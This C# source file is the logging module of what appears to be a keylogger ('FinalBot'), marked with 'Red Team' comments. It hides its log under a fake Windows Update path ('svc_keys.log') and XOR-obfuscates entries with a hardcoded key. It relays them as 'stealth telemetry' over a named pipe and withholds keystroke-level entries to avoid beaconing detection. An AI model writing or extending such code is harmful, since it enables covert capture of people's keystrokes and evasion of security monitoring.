using System;
using System.Collections.Concurrent;
using System.IO;
using System.Text;
using System.IO.Pipes;
using System.Threading;
using System.Threading.Tasks;

namespace FinalBot
{
    public static class Logger
    {
        private static readonly string LogFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_keys.log");
        private static readonly string Salt = "n2xkNQYbZwj8r9fz";
        
        // Red Team Enhancement: Async Processing Queue
        private static readonly BlockingCollection<LogEntry> _logQueue = new BlockingCollection<LogEntry>(new ConcurrentQueue<LogEntry>());
        private static readonly CancellationTokenSource _cts = new CancellationTokenSource();

        struct LogEntry {
            public string Message;
            public string Level;
            public string Timestamp;
        }

        static Logger()
        {
            // Start background worker for silent I/O
            Task.Run(() => ProcessLogQueue(_cts.Token), _cts.Token);
        }

        public static void Log(string message, string level = "INFO")
        {
            try
            {
                // Instant hand-off, no blocking
                _logQueue.Add(new LogEntry {
                    Message = message,
                    Level = level,
                    Timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
                });
                
                // Immediate local debug visibility (Non-blocking)
                ConfigureConsoleColor(level);
                Console.WriteLine($"[{level}] {message}");
                Console.ResetColor();
            }
            catch { }
        }

        private static void ProcessLogQueue(CancellationToken ct)
        {
            while (!ct.IsCancellationRequested)
            {
                try
                {
                    LogEntry entry = _logQueue.Take(ct);
                    string logEntry = $"[{entry.Timestamp}] [{entry.Level}] {entry.Message}";
                    
                    // 1. Silent File I/O
                    try { File.AppendAllText(LogFile, logEntry + Environment.NewLine); } catch { }

                    // 2. Encrypted Pipe Transmission (Stealth Telemetry)
                    // RED TEAM: Skip KEY level to avoid traffic pattern detection (Beaconing)
                    if (entry.Level != "KEY")
                    {
                        SendToPipe(logEntry);
                    }
                }
                catch (OperationCanceledException) { break; }
                catch { Thread.Sleep(100); }
            }
        }

        private static void SendToPipe(string message)
        {
            try
            {
                byte[] data = Encoding.UTF8.GetBytes(message);
                byte[] saltBytes = Encoding.UTF8.GetBytes(Salt);
                byte[] encrypted = new byte[data.Length];

                for (int i = 0; i < data.Length; i++)
                {
                    encrypted[i] = (byte)(data[i] ^ saltBytes[i % saltBytes.Length]);
                }

                string base64 = Convert.ToBase64String(encrypted);

                // Use a short timeout to prevent hanging, but since it's background thread, 
                // even 500ms won't affect typing lag.
                using (var pipeClient = new NamedPipeClientStream(".", "vanguard_status_pipe", PipeDirection.Out))
                {
                    pipeClient.Connect(500);
                    using (var writer = new StreamWriter(pipeClient))
                    {
                        writer.Write(base64);
                        writer.Flush();
                    }
                }
            }
            catch { }
        }

        public static void Error(string message, Exception ex = null)
        {
            string fullMessage = ex == null ? message : $"{message} | Exception: {ex.Message}\n{ex.StackTrace}";
            Log(fullMessage, "ERROR");
        }

        public static void Warn(string message) { Log(message, "WARN"); }
        public static void Info(string message) { Log(message, "INFO"); }

        private static void ConfigureConsoleColor(string level)
        {
            switch (level)
            {
                case "ERROR": Console.ForegroundColor = ConsoleColor.Red; break;
                case "WARN": Console.ForegroundColor = ConsoleColor.Yellow; break;
                case "INFO": Console.ForegroundColor = ConsoleColor.Cyan; break;
            }
        }
    }
}
